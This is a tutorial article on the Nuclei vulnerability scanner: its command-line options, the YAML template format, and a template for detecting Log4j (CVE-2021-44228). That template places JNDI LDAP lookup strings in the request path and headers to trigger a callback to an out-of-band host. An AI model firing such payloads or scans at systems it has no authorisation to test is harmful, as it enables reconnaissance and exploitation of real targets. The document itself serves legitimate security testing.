# Introducing Nuclei: A Fast and Customizable Vulnerability Scanner

## Introduction

Nuclei is an open-source, fast, and customizable vulnerability scanner developed by ProjectDiscovery. It is designed to send requests across targets based on predefined templates, enabling efficient and accurate vulnerability detection with minimal false positives. Nuclei supports scanning for various protocols, including TCP, DNS, HTTP, SSL, File, Whois, and Websocket[2].

## Key Features

1. Template-based scanning: Nuclei uses YAML-based templates to define scanning logic, making it highly extensible and customizable.

2. Multi-protocol support: Enables scanning across various network protocols and services.

3. Fast and efficient: Optimized for speed, allowing rapid scanning of large numbers of hosts.

4. Low false positives: Template-based approach helps minimize false positive results.

5. Community-driven: Large repository of community-contributed templates for detecting various vulnerabilities.

6. Easy integration: Can be easily integrated into CI/CD pipelines and other automated security workflows.

## Usage Examples

### Basic Scanning

To scan a single target using Nuclei:

```bash
nuclei -u https://example.com
```

To scan multiple targets from a file:

```bash
nuclei -l targets.txt
```

### Using Specific Templates

Scan with particular templates:

```bash
nuclei -u https://example.com -t cves/ -t exposures/
```

### Filtering Templates

Scan using templates with specific tags:

```bash
nuclei -u https://example.com -tags cve,oast
```

Exclude certain tags:

```bash
nuclei -u https://example.com -etags dos,fuzz
```

### Output Formatting

Generate JSON output:

```bash
nuclei -u https://example.com -json-output results.json
```

### Rate Limiting

Limit requests per second:

```bash
nuclei -u https://example.com -rate-limit 100
```

## Creating Nuclei Templates

Nuclei templates are YAML files that define the scanning logic. Here's a basic structure of a Nuclei template:

```yaml
id: example-template
info:
  name: Example Vulnerability Check
  author: YourName
  severity: medium
  description: Checks for an example vulnerability
  
requests:
  - method: GET
    path:
      - "{{BaseURL}}/vulnerable-endpoint"
    matchers:
      - type: word
        words:
          - "vulnerable string"
```

Key components of a template:

1. `id`: Unique identifier for the template
2. `info`: Metadata about the template
3. `requests`: Defines the HTTP requests to be made
4. `matchers`: Specifies conditions to identify vulnerabilities

### Example: CVE Detection Template

Here's an example template for detecting CVE-2021-44228 (Log4j vulnerability):

```yaml
id: CVE-2021-44228

info:
  name: Apache Log4j RCE
  author: pdteam
  severity: critical
  description: Apache Log4j2 <=2.14.1 JNDI features used in configuration, log messages, and parameters do not protect against attacker-controlled LDAP and other JNDI related endpoints.
  reference:
    - https://nvd.nist.gov/vuln/detail/CVE-2021-44228

requests:
  - raw:
      - |
        GET /${jndi:ldap://{{interactsh-url}}} HTTP/1.1
        Host: {{Hostname}}
        User-Agent: ${jndi:ldap://{{interactsh-url}}}
        Referer: ${jndi:ldap://{{interactsh-url}}}

    matchers-condition: and
    matchers:
      - type: word
        part: interactsh_protocol
        words:
          - "dns"
          - "http"

      - type: regex
        part: interactsh_request
        regex:
          - '([a-zA-Z0-9\.\-]+)\.([a-z0-9]+)\.([a-z0-9]+)\.\w+'
```

This template sends requests with JNDI lookup strings in various HTTP headers and checks for DNS or HTTP callbacks to detect the Log4j vulnerability[8].

## Best Practices for Template Creation

1. Use clear and descriptive template IDs and names
2. Include accurate metadata (author, severity, description)
3. Utilize dynamic variables like `{{BaseURL}}` for flexibility
4. Implement precise matchers to reduce false positives
5. Test templates thoroughly before submission
6. Follow the community guidelines for template contributions

## Conclusion

Nuclei's template-based approach offers a powerful and flexible way to conduct security scans. Its ease of use, extensibility, and community support make it a valuable tool for security professionals, bug bounty hunters, and developers alike. By understanding how to use Nuclei effectively and create custom templates, users can significantly enhance their vulnerability detection capabilities and contribute to the broader security community.

Citations:
[1] https://github.com/projectdiscovery/nuclei/milestone/43?closed=1
[2] https://gist.github.com/E1A/6755b0e74a55cf9dcd8c133c5bf6e990
[3] https://github.com/0xKayala/NucleiScanner
[4] https://github.com/projectdiscovery/nuclei-templates/actions/workflows/template-sign.yml
[5] https://github.com/projectdiscovery/nuclei/discussions/1998
[6] https://github.com/projectdiscovery/nuclei/issues/1950
[7] https://github.com/projectdiscovery/nuclei-templates/issues/8674
[8] https://github.com/CyberLegionLtd/nuclei
[9] https://github.com/projectdiscovery/nuclei/discussions/4987
[10] https://github.com/projectdiscovery/nuclei-templates/blob/main/README.md
[11] https://github.com/rootklt/nuclei-template-guide/blob/main/template-guide.md
[12] https://github.com/projectdiscovery
